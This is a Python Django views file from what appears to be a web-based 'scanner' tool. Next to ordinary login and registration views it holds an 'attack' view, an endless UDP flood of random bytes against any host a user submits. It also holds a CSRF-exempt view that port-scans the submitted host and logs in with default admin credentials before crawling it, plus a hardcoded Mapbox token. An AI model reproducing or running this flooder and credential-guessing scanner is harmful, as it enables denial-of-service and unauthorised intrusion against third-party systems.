from django.shortcuts import render, render_to_response
from subprocess import run,PIPE
import requests
import sys
from django.views.decorators.csrf import csrf_exempt
from django.template import RequestContext
from django.http import HttpResponse
import socket
import subprocess
import os
import urllib
import json
import random
import mechanize
import http.cookiejar as cookielib
from bs4 import BeautifulSoup
import html2text
import requests 
import lxml.html
from django.contrib.auth.decorators import login_required


from django.shortcuts import render, redirect

from django.contrib.auth import (
    authenticate,
    get_user_model,
    login,
    logout
)

from .forms import UserLoginForm, UserRegisterForm


def login_view(request):
    next = request.GET.get('next')
    form = UserLoginForm(request.POST or None)
    if form.is_valid():
        username = form.cleaned_data.get('username')
        password = form.cleaned_data.get('password')
        user = authenticate(username=username, password=password)
        login(request, user)
        if next:
            return redirect(next)
        return redirect('/welcome')

    context = {
        'form': form,
    }
    return render(request, "login.html", context)


def register_view(request):
    next = request.GET.get('next')
    form = UserRegisterForm(request.POST or None)
    if form.is_valid():
        user = form.save(commit=False)
        password = form.cleaned_data.get('password')
        user.set_password(password)
        user.save()
        new_user = authenticate(username=user.username, password=password)
        login(request, new_user)
        if next:
            return redirect(next)
        return redirect('/')

    context = {
        'form': form,
    }
    return render(request, "signup.html", context)


def logout_view(request):
    logout(request)
    return redirect('/')

@login_required
def index(request):
    return render_to_response('index.html')

@csrf_exempt
def external(request):
    remoteServer    = request.POST.get('param')
    remoteServerIP  = socket.gethostbyname(remoteServer)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",remoteServer , "portsOpen: ", fixed_list)

    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+remoteServer)
    data=ip_locate.read()
    values=json.loads(data)
    val=values['lat']
    val2=values['lon']

    b=len(fixed_list)/31
    c=b*100
    # -------------------------------------------
    links  = set()                             
    visited_links  = set()
    # Cookie Jar

    cj=cookielib.LWPCookieJar()
    def visit(br, url):
        br.open(url)
        br._factory.is_html = True
        links = br.links()
        for link in links:
            if not link.url in links:
                visited_links.add(link.url)  

    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    #br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
    thelink='http://'+remoteServer
    br.open(thelink)

    # Select the second (index one) form (the first form is a search query box)
    
    br.select_form(nr=0)

    # User credentials
    br.form['email'] = 'admin@admin.com'
    br.form['password'] = 'password'
    br.submit()
    
    br.set_cookiejar(cj)
    print(cj)

    visit(br,thelink)
    bar=visited_links.copy()
    for e in bar:
        visit(br,e)
    
    print(list(visited_links))
    
        # -------------------------------------------------------------------
    a=render(request, 'index.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links)})
    
    
    return a
    

def default_map(request):
    mapbox_access_token = 'pk.eyJ1IjoibWFzdGVyZWxhaGVlIiwiYSI6ImNrOWp0am43MTFtM3IzbHA0dzhuOHZiN3UifQ.kgIXiMoyl9tfKZcFys9b_Q'
    return render(request, 'default.html', {'mapbox_access_token': mapbox_access_token})


def attack(request):
    remoteServer2    = request.POST.get('param2')
    remoteServerIP2  = socket.gethostbyname(remoteServer2)
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(1490)
    sent = 0
    port=80
    while True:
        sock2.sendto(bytes, (remoteServerIP2,port))
        sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s"%(sent,remoteServerIP2,port))
        if port == 65534:
            port = 1

def urlscraper(url):
       
    
   # Browser

    links  = set()                             
    visited_links  = set()
    # Cookie Jar

    cj=cookielib.LWPCookieJar()

    # Browser options

    # The site we will navigate into, handling it's session
    
                
                
                

    # urlList = []
    # getpage= requests.get('http://f27ad1ed2e47.ngrok.io/admin')

    # getpage_soup= BeautifulSoup(getpage.text, 'html.parser')

    # all_links= getpage_soup.findAll('a', href=True)
    # print(all_links)





    if __name__ == '__main__':
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        #br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
        
        br.open(url)

        # Select the second (index one) form (the first form is a search query box)
        
        br.select_form(nr=0)

        # User credentials
        br.form['email'] = 'admin@admin.com'
        br.form['password'] = 'password'
        br.submit()
        
        br.set_cookiejar(cj)
        print(cj)
        # br.addheaders=[('Cookie',cj)]
        

        
        visit(br,url)
        bar=visited_links.copy()
        for e in bar:
            
            visit(br,e)
        print(list(visited_links))
        legit=list(visited_links)
        return legit